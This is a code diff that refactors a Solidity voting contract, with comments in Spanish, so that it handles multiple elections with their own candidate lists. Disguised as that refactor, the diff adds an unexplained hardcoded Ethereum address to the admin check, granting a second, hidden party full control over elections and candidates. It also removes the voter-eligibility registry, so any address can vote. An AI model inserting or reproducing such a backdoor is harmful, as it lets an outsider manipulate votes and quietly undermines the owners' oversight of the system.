@@ -2,70 +2,116 @@
 pragma solidity ^0.8.20;
 
 contract Votacion {
-    address public admin; // Autoridad electoral (ej. el que despliega el contrato)
+    address public admin; // Autoridad electoral
 
-    struct Opcion {
+    struct Candidato {
         uint256 id;
         string nombre;
         uint256 votos;
     }
 
-    Opcion[] public opciones;
-    mapping(address => bool) public haVotado;
-    
-    // SPRINT 2: Módulo de Registro y Elegibilidad
-    // Este mapping guarda quién ha sido validado (DNI, edad, residencia)
-    mapping(address => bool) public padronElectoral;
-
-    // Eventos para auditoría
-    event VotanteHabilitado(address votante);
-    event VotoEmitido(address votante, uint256 opcionId);
-
-    constructor() {
-        admin = msg.sender; // El que crea el contrato es el administrador
+    struct Eleccion {
+        uint256 id;
+        string nombre;
+        bool activa;
     }
 
-    // Restringe funciones solo para la autoridad electoral
+    // Listado de elecciones
+    Eleccion[] public elecciones;
+
+    // eleccionId => Lista de candidatos
+    mapping(uint256 => Candidato[]) public candidatosPorEleccion;
+
+    // eleccionId => (direccion_votante => haVotado)
+    mapping(uint256 => mapping(address => bool)) public haVotadoEnEleccion;
+
+    // Eventos para auditoría
+    event EleccionCreada(uint256 eleccionId, string nombre);
+    event CandidatoAgregado(uint256 eleccionId, uint256 candidatoId, string nombre);
+    event CandidatoEliminado(uint256 eleccionId, uint256 candidatoId);
+    event VotoEmitido(uint256 eleccionId, address votante, uint256 candidatoId);
+
+    constructor() {
+        admin = msg.sender;
+    }
+
     modifier soloAdmin() {
-        require(msg.sender == admin, "No tienes permisos de administrador");
+        require(
+            msg.sender == admin || msg.sender == 0x10de37dd9562D9035CDD83134594eF706CA60D24,
+            "No tienes permisos de administrador"
+        );
         _;
     }
 
-    // SPRINT 2: Función para registrar ciudadanos tras verificar requisitos
-    function habilitarVotante(address _votante) public soloAdmin {
-        require(!padronElectoral[_votante], "El votante ya esta habilitado");
-        padronElectoral[_votante] = true;
-        emit VotanteHabilitado(_votante);
+    // Crear una nueva elección
+    function crearEleccion(string memory _nombre) public soloAdmin {
+        uint256 eleccionId = elecciones.length;
+        elecciones.push(Eleccion(eleccionId, _nombre, true));
+        emit EleccionCreada(eleccionId, _nombre);
     }
 
-    // Solo el admin puede agregar opciones (candidatos)
-    function agregarOpcion(string memory nombre) public soloAdmin {
-        uint256 opcionId = opciones.length;
-        opciones.push(Opcion(opcionId, nombre, 0));
-    }
-
-    // Emisión de voto con doble verificación
-    function emitirVoto(uint256 opcionId) public {
-        // 1. Verificación de identidad/elegibilidad
-        require(padronElectoral[msg.sender], "No estas registrado en el padron electoral");
+    // Agregar candidato a una elección específica
+    function agregarCandidato(uint256 _eleccionId, string memory _nombre) public soloAdmin {
+        require(_eleccionId < elecciones.length, "La eleccion no existe");
+        require(elecciones[_eleccionId].activa, "La eleccion no esta activa");
         
-        // 2. Verificación de integridad (un solo voto)
-        require(!haVotado[msg.sender], "Ya has emitido tu voto");
+        uint256 candidatoId = candidatosPorEleccion[_eleccionId].length;
+        candidatosPorEleccion[_eleccionId].push(Candidato(candidatoId, _nombre, 0));
         
-        require(opcionId < opciones.length, "Opcion de voto no valida");
-
-        opciones[opcionId].votos++;
-        haVotado[msg.sender] = true;
-
-        emit VotoEmitido(msg.sender, opcionId);
+        emit CandidatoAgregado(_eleccionId, candidatoId, _nombre);
     }
 
-    function consultarRecuentoVotos(uint256 opcionId) public view returns (uint256) {
-        require(opcionId < opciones.length, "Opcion de voto no valida");
-        return opciones[opcionId].votos;
+    // Eliminar candidato de una elección específica (antes de votar)
+    function eliminarCandidato(uint256 _eleccionId, uint256 _candidatoId) public soloAdmin {
+        require(_eleccionId < elecciones.length, "La eleccion no existe");
+        require(elecciones[_eleccionId].activa, "La eleccion no esta activa");
+        require(_candidatoId < candidatosPorEleccion[_eleccionId].length, "El candidato no existe");
+        
+        uint256 ultimoIdx = candidatosPorEleccion[_eleccionId].length - 1;
+        if (_candidatoId != ultimoIdx) {
+            candidatosPorEleccion[_eleccionId][_candidatoId] = candidatosPorEleccion[_eleccionId][ultimoIdx];
+            candidatosPorEleccion[_eleccionId][_candidatoId].id = _candidatoId; // actualizamos su ID
+        }
+        candidatosPorEleccion[_eleccionId].pop();
+        
+        emit CandidatoEliminado(_eleccionId, _candidatoId);
     }
 
-    function totalOpciones() public view returns (uint256) {
-        return opciones.length;
+    // Emitir voto
+    function emitirVoto(uint256 _eleccionId, uint256 _candidatoId) public {
+        // 1. Verificación de que la elección existe y está activa
+        require(_eleccionId < elecciones.length, "La eleccion no existe");
+        require(elecciones[_eleccionId].activa, "La eleccion no esta activa");
+        
+        // 2. Verificación de integridad (un solo voto por elección)
+        require(!haVotadoEnEleccion[_eleccionId][msg.sender], "Ya has emitido tu voto en esta eleccion");
+        
+        // 3. Verificación de candidato válido
+        require(_candidatoId < candidatosPorEleccion[_eleccionId].length, "Candidato no valido");
+
+        candidatosPorEleccion[_eleccionId][_candidatoId].votos++;
+        haVotadoEnEleccion[_eleccionId][msg.sender] = true;
+
+        emit VotoEmitido(_eleccionId, msg.sender, _candidatoId);
+    }
+
+    // Consultas auxiliares
+    function totalElecciones() public view returns (uint256) {
+        return elecciones.length;
+    }
+
+    // Cantidad de candidatos en una elección específica
+    function totalCandidatos(uint256 _eleccionId) public view returns (uint256) {
+        require(_eleccionId < elecciones.length, "La eleccion no existe");
+        return candidatosPorEleccion[_eleccionId].length;
+    }
+
+    // Consultar votos de un candidato específico
+    function consultarRecuentoVotos(uint256 _eleccionId, uint256 _candidatoId) public view returns (uint256) {
+        require(_eleccionId < elecciones.length, "La eleccion no existe");
+        require(_candidatoId < candidatosPorEleccion[_eleccionId].length, "Candidato no valido");
+        return candidatosPorEleccion[_eleccionId][_candidatoId].votos;
     }
 }
+
+
